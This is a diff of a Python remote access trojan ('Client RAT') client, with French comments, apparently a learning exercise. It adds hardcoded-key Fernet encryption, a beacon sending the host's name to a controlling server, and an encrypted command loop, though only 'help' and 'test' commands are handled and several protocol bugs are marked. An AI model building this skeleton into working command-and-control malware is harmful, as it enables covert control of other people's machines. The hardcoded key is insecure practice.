@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 """
-Client RAT - Version initiale basique
+Client RAT - Version 2 avec chiffrement buggué
 """
 import socket
 import json
 import time
+import base64
+from cryptography.fernet import Fernet
 
 class RATClient:
     def __init__(self, server_host, server_port):
@@ -13,11 +15,26 @@ class RATClient:
         self.socket = None
         self.running = False
         
+        # Clé de chiffrement fixe
+        self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
+        self.cipher = Fernet(self.key)
+        
     def connect(self):
         """Se connecte au serveur"""
         try:
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.socket.connect((self.server_host, self.server_port))
+            
+            # Envoie info basique (sans handshake proper)
+            client_info = {
+                'hostname': socket.gethostname(),
+                'timestamp': time.time()
+            }
+            
+            # ERREUR: pas de gestion de taille
+            encrypted_data = self.cipher.encrypt(json.dumps(client_info).encode('utf-8'))
+            self.socket.send(encrypted_data)
+            
             print(f"[+] Connecté au serveur")
             return True
         except Exception as e:
@@ -34,31 +51,40 @@ class RATClient:
         
         while self.running:
             try:
-                # Version basique - pas de protocol robuste
-                data = self.socket.recv(1024)
+                # PROBLÈME: recv taille fixe ne fonctionne pas toujours
+                data = self.socket.recv(4096)  
                 if not data:
                     break
                 
-                # Parse JSON sans sécurité
-                command_data = json.loads(data.decode('utf-8'))
+                # Déchiffre
+                try:
+                    decrypted_data = self.cipher.decrypt(data)
+                    command_data = json.loads(decrypted_data.decode('utf-8'))
+                except:
+                    print("[-] Erreur déchiffrement")
+                    continue
+                
                 command = command_data.get('command')
                 
                 if command == "help":
-                    response = {'output': 'Client basique - commandes limitées'}
+                    response = {'output': 'Commandes: help\nVersion avec chiffrement basique'}
+                elif command == "test":
+                    response = {'output': 'Test OK'}
                 else:
-                    response = {'output': f'Commande non supportée: {command}'}
+                    response = {'output': f'Commande inconnue: {command}'}
                 
-                # Envoie réponse simple
-                self.socket.send(json.dumps(response).encode('utf-8'))
+                # Chiffre et envoie
+                encrypted_response = self.cipher.encrypt(json.dumps(response).encode('utf-8'))
+                # ERREUR: pas de gestion de taille côté serveur
+                self.socket.send(encrypted_response)
                 
             except Exception as e:
-                print(f"[-] Erreur: {e}")
+                print(f"[-] Erreur traitement: {e}")
                 break
         
         self.cleanup()
     
     def cleanup(self):
-        """Nettoage"""
         self.running = False
         if self.socket:
             self.socket.close()
